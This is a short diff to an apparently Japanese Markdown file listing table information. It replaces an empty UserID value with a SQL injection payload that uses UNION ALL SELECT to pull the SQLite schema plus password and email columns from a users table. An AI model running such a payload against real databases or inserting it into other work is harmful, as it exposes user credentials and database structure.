@@ -19,4 +19,4 @@
 
 ### テーブル情報
 
-- UserID: ``
+- UserID: `' UNION ALL SELECT id, (select sql from sqlite_master where type='table'), password, email FROM users WHERE userid = 'alice`
